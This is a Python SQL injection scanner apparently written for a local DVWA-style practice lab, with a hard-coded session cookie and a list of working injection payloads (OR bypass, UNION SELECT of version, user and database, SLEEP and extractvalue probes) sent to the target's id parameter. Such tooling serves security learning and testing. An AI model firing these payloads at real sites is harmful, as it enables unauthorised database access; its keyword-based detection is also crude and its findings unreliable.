#!/usr/bin/env python3
"""
SQL Injection Vulnerability Scanner (Professional Version)
Author: Youssef
Description: Detects SQL injection vulnerabilities with reduced false positives
"""

import requests
import sys
import time
from datetime import datetime

# ─── CONFIGURATION ───────────────────────────────────────────────

TARGET_URL = "http://127.0.0.1:42001/vulnerabilities/sqli/"

SESSION_COOKIE = {
    "PHPSESSID": "9e124456d84d6cd2cecb9df8d2f9c4d0",
    "security": "low"
}

# ─── PAYLOADS ───────────────────────────────────────────────────

PAYLOADS = [
    ("Basic OR bypass",          "1' OR '1'='1"),
    ("Always true",              "1' OR 1=1 --"),
    ("Comment bypass",           "1' --"),
    ("Union basic",              "1' UNION SELECT null,null --"),
    ("Union version",            "1' UNION SELECT null,version() --"),
    ("Union user",               "1' UNION SELECT null,user() --"),
    ("Union database",           "1' UNION SELECT null,database() --"),
    ("Time-based sleep",         "1' AND SLEEP(2) --"),
    ("Error-based",              "1' AND extractvalue(1,concat(0x7e,version())) --"),
    ("Blind true",               "1' AND 1=1 --"),
    ("Blind false",              "1' AND 1=2 --"),
]

SUCCESS_INDICATORS = [
    "first name", "surname", "admin",
    "mysql", "warning", "error",
    "unknown column", "sql",
    "information_schema"
]

SEPARATOR = "─" * 70


# ─── FUNCTIONS ──────────────────────────────────────────────────

def print_banner():
    print(f"""
{SEPARATOR}
SQL Injection Scanner — Professional Version
Target: {TARGET_URL}
Date: {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}
{SEPARATOR}
""")


def get_baseline(session):
    try:
        resp = session.get(TARGET_URL, params={"id": "1", "Submit": "Submit"})
        return resp.text
    except Exception as e:
        print(f"[ERROR] Cannot reach target: {e}")
        sys.exit(1)


def is_vulnerable(response, baseline, elapsed, payload):
    response_lower = response.lower()

    # 1. Strong indicators (most reliable)
    for indicator in SUCCESS_INDICATORS:
        if indicator in response_lower:
            return True, f"Strong indicator found: {indicator}"

    # 2. Time-based detection
    if "sleep" in payload.lower() and elapsed > 1.5:
        return True, f"Time-based delay detected ({elapsed:.2f}s)"

    # 3. Response size difference (only if meaningful)
    if len(response) > 0 and abs(len(response) - len(baseline)) > 200:
        return True, f"Significant response difference ({len(response)} vs {len(baseline)})"

    # Ignore empty responses (prevent false positives)
    if len(response) == 0:
        return False, "Empty response ignored"

    return False, "No reliable indicator"


def scan(session, baseline):
    results = []
    vuln_count = 0

    print("[*] Starting SQL Injection Scan...\n")

    for i, (name, payload) in enumerate(PAYLOADS, 1):
        print(f"[{i:02d}] Testing: {name}")
        print(f"     Payload: {payload}")

        try:
            start = time.time()

            resp = session.get(
                TARGET_URL,
                params={"id": payload, "Submit": "Submit"},
                timeout=10
            )

            elapsed = time.time() - start

            print(f"     Response size: {len(resp.text)} bytes | Time: {elapsed:.2f}s")

            vuln, reason = is_vulnerable(resp.text, baseline, elapsed, payload)

            if vuln:
                print(f"     [!] VULNERABLE → {reason}\n")
                vuln_count += 1
            else:
                print(f"     [-] Not vulnerable → {reason}\n")

            results.append({
                "name": name,
                "payload": payload,
                "vulnerable": vuln,
                "reason": reason,
                "time": elapsed
            })

        except Exception as e:
            print(f"     [ERROR] {e}\n")

    return results, vuln_count


def print_summary(results, vuln_count):
    print(SEPARATOR)
    print("SCAN SUMMARY")
    print(SEPARATOR)

    print(f"Total payloads: {len(results)}")
    print(f"Vulnerable:     {vuln_count}")
    print(f"Safe:           {len(results) - vuln_count}\n")

    print("CONFIRMED VULNERABILITIES:\n")

    for r in results:
        if r["vulnerable"]:
            print(f"- {r['name']}")
            print(f"  Payload: {r['payload']}")
            print(f"  Reason:  {r['reason']}\n")


def save_report(results):
    filename = f"sqli_report_{datetime.now().strftime('%Y%m%d_%H%M%S')}.txt"

    with open(filename, "w") as f:
        f.write("SQL INJECTION SCAN REPORT\n")
        f.write(f"Date: {datetime.now()}\n")
        f.write(f"Target: {TARGET_URL}\n\n")

        for r in results:
            f.write(f"[{'+' if r['vulnerable'] else '-'}] {r['name']}\n")
            f.write(f"Payload: {r['payload']}\n")
            f.write(f"Result: {'VULNERABLE' if r['vulnerable'] else 'SAFE'}\n")
            f.write(f"Reason: {r['reason']}\n\n")

    print(f"[*] Report saved: {filename}")


# ─── MAIN ───────────────────────────────────────────────────────

def main():
    print_banner()

    session = requests.Session()
    session.cookies.update(SESSION_COOKIE)

    print("[*] Getting baseline response...")
    baseline = get_baseline(session)
    print(f"[*] Baseline size: {len(baseline)} bytes\n")

    results, vuln_count = scan(session, baseline)

    print_summary(results, vuln_count)
    save_report(results)


if __name__ == "__main__":
    main()